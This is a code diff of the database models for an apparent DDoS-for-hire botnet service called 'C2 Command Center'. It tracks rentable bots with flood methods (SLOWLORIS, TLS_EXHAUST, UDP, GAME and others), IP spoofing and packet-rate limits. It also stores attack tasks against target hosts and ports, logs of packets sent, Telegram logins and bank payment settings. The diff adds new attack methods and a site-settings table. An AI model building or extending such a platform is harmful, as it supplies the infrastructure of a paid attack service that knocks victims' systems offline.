@@ -60,7 +60,7 @@ class UserSubscription(Base):
 class Payment(Base):
     __tablename__ = "payments"
     id = Column(UUID, primary_key=True, default=new_uuid)
-    user_id = Column(UUID, ForeignKey("users.id"), nullable=False)
+    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
     amount_vnd = Column(Integer, nullable=False)
     amount_usd = Column(DECIMAL(10,2))
     method = Column(String(32), nullable=False)
@@ -86,12 +86,12 @@ class Bot(Base):
     net_speed_mbps = Column(Integer)
     status = Column(String(16), default="offline")
     is_rented = Column(Boolean, default=False)
-    rented_by_user_id = Column(UUID, ForeignKey("users.id"), nullable=True)
+    rented_by_user_id = Column(UUID, ForeignKey("users.id", ondelete="SET NULL"), nullable=True)
     rental_expires_at = Column(DateTime(timezone=True))
     max_pps = Column(Integer, default=50000000)
     max_mbps = Column(Integer, default=1000)
     max_threads = Column(Integer, default=10000)
-    enabled_methods = Column(ARRAY(Text), default=lambda: ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","UDP"])
+    enabled_methods = Column(ARRAY(Text), default=lambda: ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","UDP"])
     spoof_mode = Column(Integer, default=0)
     fragmentation = Column(Boolean, default=False)
     last_heartbeat_at = Column(DateTime(timezone=True))
@@ -102,7 +102,7 @@ class Bot(Base):
 class AttackTask(Base):
     __tablename__ = "attack_tasks"
     id = Column(UUID, primary_key=True, default=new_uuid)
-    user_id = Column(UUID, ForeignKey("users.id"), nullable=False)
+    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), nullable=False)
     target_host = Column(String(255), nullable=False)
     target_port = Column(Integer, nullable=False)
     method = Column(String(16), nullable=False)
@@ -126,8 +126,8 @@ class AttackTask(Base):
 class AttackLog(Base):
     __tablename__ = "attack_logs"
     id = Column(BigInteger, primary_key=True, autoincrement=True)
-    task_id = Column(UUID, ForeignKey("attack_tasks.id"), nullable=False)
-    bot_id = Column(UUID, ForeignKey("bots.id"), nullable=False)
+    task_id = Column(UUID, ForeignKey("attack_tasks.id", ondelete="CASCADE"), nullable=False)
+    bot_id = Column(UUID, ForeignKey("bots.id", ondelete="CASCADE"), nullable=False)
     packets_sent = Column(BigInteger, default=0)
     bytes_sent = Column(BigInteger, default=0)
     started_at = Column(DateTime(timezone=True))
@@ -136,7 +136,7 @@ class AttackLog(Base):
 class AdminLog(Base):
     __tablename__ = "admin_logs"
     id = Column(BigInteger, primary_key=True, autoincrement=True)
-    admin_id = Column(UUID, ForeignKey("users.id"), nullable=False)
+    admin_id = Column(UUID, ForeignKey("users.id", ondelete="SET NULL"), nullable=True)
     action = Column(String(128), nullable=False)
     target_type = Column(String(64))
     target_id = Column(UUID)
@@ -146,9 +146,29 @@ class AdminLog(Base):
 class TelegramSession(Base):
     __tablename__ = "telegram_sessions"
     id = Column(UUID, primary_key=True, default=new_uuid)
-    user_id = Column(UUID, ForeignKey("users.id"), unique=True, nullable=False)
+    user_id = Column(UUID, ForeignKey("users.id", ondelete="CASCADE"), unique=True, nullable=False)
     chat_id = Column(BigInteger, nullable=False)
     state = Column(String(32), default="idle")
     data = Column(JSONB, default=dict)
+    login_code = Column(String(32), nullable=True)
+    login_code_expires = Column(DateTime(timezone=True), nullable=True)
     created_at = Column(DateTime(timezone=True), default=utcnow)
     user = relationship("User", back_populates="telegram_session")
+
+
+class SiteSettings(Base):
+    __tablename__ = "site_settings"
+    id = Column(Integer, primary_key=True, default=1)
+    site_name = Column(String(128), default="C2 Command Center")
+    site_url = Column(String(255), default="")
+    telegram_bot_username = Column(String(64), default="")
+    # Bank config
+    bank_account_name = Column(String(255), default="")
+    bank_account_number = Column(String(32), default="")
+    bank_name = Column(String(64), default="MBBank")
+    bank_bin = Column(String(16), default="970422")
+    # Pricing
+    min_deposit = Column(Integer, default=10000)
+    # Misc
+    maintenance_mode = Column(Boolean, default=False)
+    updated_at = Column(DateTime(timezone=True), default=utcnow, onupdate=utcnow)
